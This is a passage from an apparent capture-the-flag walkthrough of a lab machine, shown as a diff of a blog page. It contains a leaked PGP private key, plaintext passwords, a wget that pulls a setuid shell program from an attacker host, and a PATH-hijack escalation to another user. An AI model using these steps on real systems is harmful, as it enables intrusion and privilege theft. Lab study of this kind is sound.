+</span><span class='line'>NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
+</span><span class='line'>jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
+</span><span class='line'>bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
+</span><span class='line'>mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
+</span><span class='line'>7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
+</span><span class='line'>OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
+</span><span class='line'>yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
+</span><span class='line'>oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
+</span><span class='line'>ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
+</span><span class='line'>qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
+</span><span class='line'>a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
+</span><span class='line'>fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
+</span><span class='line'>7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
+</span><span class='line'>HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
+</span><span class='line'>Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
+</span><span class='line'>yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
+</span><span class='line'>l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
+</span><span class='line'>vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
+</span><span class='line'>zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
+</span><span class='line'>quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
+</span><span class='line'>tqg=
+</span><span class='line'>=SCkw
+</span><span class='line'>-----END PGP PRIVATE KEY BLOCK-----
+</span><span class='line'>$
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After poking around, I found <code>.pgp</code> hidden folder which include PGP private key and public key in jack&rsquo;s home directory, take a note and will be used later.</p>
+
+<h2>Moving to <em>milk_4_life</em></h2>
+
+<p>Then I was trying to login to MYSQL database and found jack&rsquo;s web admin password is <em><font color="red">g0tmi1k69</font></em></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>$ mysql -uwww-data -p
+</span><span class='line'>Enter password:
+</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
+</span><span class='line'>Your MySQL connection id is 37
+</span><span class='line'>Server version: 5.5.37-0+wheezy1 (Debian)
+</span><span class='line'>
+</span><span class='line'>Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+</span><span class='line'>
+</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
+</span><span class='line'>affiliates. Other names may be trademarks of their respective
+</span><span class='line'>owners.
+</span><span class='line'>
+</span><span class='line'>Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+</span><span class='line'>
+</span><span class='line'>mysql&gt; show databases;
+</span><span class='line'>+--------------------+
+</span><span class='line'>| Database           |
+</span><span class='line'>+--------------------+
+</span><span class='line'>| information_schema |
+</span><span class='line'>| website            |
+</span><span class='line'>+--------------------+
+</span><span class='line'>2 rows in set (0.01 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; use website
+</span><span class='line'>Reading table information for completion of table and column names
+</span><span class='line'>You can turn off this feature to get a quicker startup with -A
+</span><span class='line'>
+</span><span class='line'>Database changed
+</span><span class='line'>mysql&gt; show tables;
+</span><span class='line'>+-------------------+
+</span><span class='line'>| Tables_in_website |
+</span><span class='line'>+-------------------+
+</span><span class='line'>| users             |
+</span><span class='line'>+-------------------+
+</span><span class='line'>1 row in set (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; select * from users;
+</span><span class='line'>+----------+-----------+
+</span><span class='line'>| username | password  |
+</span><span class='line'>+----------+-----------+
+</span><span class='line'>| Jack     | g0tmi1k69 |
+</span><span class='line'>+----------+-----------+
+</span><span class='line'>1 row in set (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I found there is an email for jack but it is encrypted by PGP, so I need using pgp private key (which is found before) to decrypt the message. Here is a handy <code>gpg</code> help <a href="http://irtfweb.ifa.hawaii.edu/~lockhart/gpg/gpg-cs.html">guide</a>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -alh /var/mail
+</span><span class='line'>total 16K
+</span><span class='line'>drwxrwsr-x  4 root   mail   4.0K Jul 15 09:25 .
+</span><span class='line'>drwxr-xr-x 12 root   root   4.0K Jun 17  2014 ..
+</span><span class='line'>drwxr-sr-x  2 george george 4.0K Jun 20  2014 george
+</span><span class='line'>drwxr-sr-x  3 jack   jack   4.0K Jul  5  2014 jack
+</span><span class='line'>$ ls -alh /var/mail/jack
+</span><span class='line'>total 12K
+</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 .
+</span><span class='line'>drwxrwsr-x 4 root mail 4.0K Jul 15 09:25 ..
+</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 received
+</span><span class='line'>$ ls -alh /var/mail/jack/received
+</span><span class='line'>total 12K
+</span><span class='line'>drwxr-sr-x 2 root mail 4.0K Jun 18  2014 .
+</span><span class='line'>drwxr-sr-x 3 jack jack 4.0K Jul  5  2014 ..
+</span><span class='line'>-rw-r--r-- 1 root mail  709 Jun 18  2014 message.eml
+</span><span class='line'>$ cat /var/mail/jack/received/message.eml
+</span><span class='line'>-----BEGIN PGP MESSAGE-----
+</span><span class='line'>Version: BCPG C# v1.6.1.0
+</span><span class='line'>
+</span><span class='line'>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
+</span><span class='line'>yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
+</span><span class='line'>3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
+</span><span class='line'>7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
+</span><span class='line'>rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
+</span><span class='line'>MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
+</span><span class='line'>9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
+</span><span class='line'>V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
+</span><span class='line'>svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+</span><span class='line'>+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
+</span><span class='line'>=svWU
+</span><span class='line'>-----END PGP MESSAGE-----
+</span><span class='line'>$ gpg --allow-secret-key-import --import .pgp/pgp.priv
+</span><span class='line'>gpg: key 3F18AB0A: secret key imported
+</span><span class='line'>gpg: key 3F18AB0A: "jack@cowlovers.com" not changed
+</span><span class='line'>gpg: Total number processed: 1
+</span><span class='line'>gpg:              unchanged: 1
+</span><span class='line'>gpg:       secret keys read: 1
+</span><span class='line'>gpg:   secret keys imported: 1
+</span><span class='line'>$ gpg /var/mail/jack/received/message.eml
+</span><span class='line'>
+</span><span class='line'>You need a passphrase to unlock the secret key for
+</span><span class='line'>user: "jack@cowlovers.com"
+</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
+</span><span class='line'>
+</span><span class='line'>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
+</span><span class='line'>      "jack@cowlovers.com"
+</span><span class='line'>gpg: /var/mail/jack/received/message.eml: unknown suffix
+</span><span class='line'>Enter new filename [text.txt]: 
+</span><span class='line'>gpg: WARNING: message was not integrity protected
+</span><span class='line'>$ cat text.txt
+</span><span class='line'>Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed. 
+</span><span class='line'>
+</span><span class='line'>The password is '4J0WWvL5nS'
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we got user <code>milk_4_life</code> has password: <em><font color="red">4J0WWvL5nS</font></em></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh milk_4_life@localhost
+</span><span class='line'>The authenticity of host 'localhost (::1)' can't be established.
+</span><span class='line'>ECDSA key fingerprint is e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa.
+</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
+</span><span class='line'>Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+</span><span class='line'>milk_4_life@localhost's password: 
+</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Sun Jul 12 07:02:03 2015 from 10.10.10.131
+</span><span class='line'>$ id
+</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
+</span><span class='line'>$ pwd
+</span><span class='line'>/home/milk_4_life
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 12
+</span><span class='line'>---s--x--x 1 george      george      5743 Jun 19  2014 game
+</span><span class='line'>-rwxr-xr-x 1 milk_4_life milk_4_life  473 Jul 11 20:36 win.py
+</span><span class='line'>$ ls -alh
+</span><span class='line'>total 36K
+</span><span class='line'>drwx------ 2 milk_4_life milk_4_life 4.0K Jul 12 06:59 .
+</span><span class='line'>drwxr-xr-x 7 root        root        4.0K Jul  5  2014 ..
+</span><span class='line'>-rw------- 1 milk_4_life milk_4_life   51 Jul 12 07:24 .bash_history
+</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life    1 Jun 22  2014 .bash_logout
+</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life 3.4K Jan  1  2013 .bashrc
+</span><span class='line'>---s--x--x 1 george      george      5.7K Jun 19  2014 game
+</span><span class='line'>-rwx------ 1 milk_4_life milk_4_life  675 Jan  1  2013 .profile</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Moving to <em>george</em></h2>
+
+<p>Here we can see that there is program <code>game</code> which is owned by george and sticky bit has been set. That means this program has high possibility to be exploited for privilege escaping to george.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ss -lnt
+</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port 
+</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            *:*     
+</span><span class='line'>LISTEN     0      128                                                              *:57356                                                           *:*     
+</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::*     
+</span><span class='line'>LISTEN     0      128                                                              *:111                                                             *:*     
+</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::*     
+</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::*     
+</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::*     
+</span><span class='line'>LISTEN     0      128                                                              *:22                                                              *:*     
+</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::*     
+</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              *:*     
+</span><span class='line'>LISTEN     0      10                                                               *:666                                                             *:*     
+</span><span class='line'>$ ./game &
+</span><span class='line'>$ I'm listening
+</span><span class='line'>
+</span><span class='line'>$ ss -lnt
+</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port 
+</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            *:*     
+</span><span class='line'>LISTEN     0      128                                                              *:57356                                                           *:*     
+</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::*     
+</span><span class='line'>LISTEN     0      128                                                              *:111                                                             *:*     
+</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::*     
+</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::*     
+</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::*     
+</span><span class='line'>LISTEN     0      128                                                              *:22                                                              *:*     
+</span><span class='line'>LISTEN     0      10                                                               *:1337                                                            *:*     
+</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::*     
+</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              *:*     
+</span><span class='line'>LISTEN     0      10                                                               *:666                                                             *:*     
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After I run the game program and check listening ports, I found game is listening on port <em>1337</em>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet 127.0.0.1 1337
+</span><span class='line'>Trying 127.0.0.1...
+</span><span class='line'>Connected to 127.0.0.1.
+</span><span class='line'>Escape character is '^]'.
+</span><span class='line'>Type 'START' to begin
+</span><span class='line'>
+</span><span class='line'>START 
+</span><span class='line'>Starting...
+</span><span class='line'>
+</span><span class='line'>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)
+</span><span class='line'>
+</span><span class='line'>Quick what's... 769 x 49? 48
+</span><span class='line'>Quick what's... 413 x 17? 15
+</span><span class='line'>Quick what's... 779 x 106? 45
+</span><span class='line'>Quick what's... 439 x 803? 55
+</span><span class='line'>Quick what's... 555 x 341? 821
+</span><span class='line'>Quick what's... 976 x 1? 
+</span><span class='line'>Lol nope
+</span><span class='line'>
+</span><span class='line'>Final Score: 0
+</span><span class='line'>
+</span><span class='line'>Connection closed by foreign host.
+</span><span class='line'>[1] + Done                       ./game
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to win the game, I wrote a python script to calculate and send the result back to program.</p>
+
+<figure class='code'><figcaption><span>my_win.py  (my_win.py)</span> <a href='/downloads/code/my_win.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
+</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">res</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START/n&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="k">print</span> <span class="n">res</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s\.\.\. (.*)\?&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;pattern is not found!&quot;</span>
+</span><span class='line'>      <span class="k">print</span> <span class="n">res</span>
+</span><span class='line'>      <span class="k">break</span>
+</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>      <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">rst</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">print</span> <span class="n">rst</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rst</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After running the script and win the game, something new appeared <code>I hear the faint sound of chmodding........</code>. That sounds like command <code>chmod</code> has been called after win the game.</p>
+
+<p><img class="left" src="/downloads/Hell1/4.png"></p>
+
+<p>Now I decided to check if the command <code>chmod</code> is called from absolute path or not. I upload setuid.c to target server&rsquo;s temporary directory <code>/tmp/</code>, compile it and change the name to <code>chmod</code>.</p>
+
+<figure class='code'><figcaption><span>setuid.c  (setuid.c)</span> <a href='/downloads/code/setuid.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget http://10.10.10.131/setuid.c
+</span><span class='line'>--2015-07-16 08:49:24--  http://10.10.10.131/setuid.c
+</span><span class='line'>Connecting to 10.10.10.131:80... connected.
+</span><span class='line'>HTTP request sent, awaiting response... 200 OK
+</span><span class='line'>Length: 122 [text/x-csrc]
+</span><span class='line'>Saving to: `setuid.c'
+</span><span class='line'>
+</span><span class='line'>100%[======================================>] 122         --.-K/s   in 0s      
+</span><span class='line'>
+</span><span class='line'>2015-07-16 08:49:24 (14.9 MB/s) - `setuid.c' saved [122/122]
+</span><span class='line'>
+</span><span class='line'>$ ls -l
+</span><span class='line'>total 4
+</span><span class='line'>-rw-r--r-- 1 milk_4_life milk_4_life 122 Jul 15 22:47 setuid.c
+</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I add <code>/tmp</code> to the beginning of the environmental PATH variable. Then I play the game and run python script to win.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
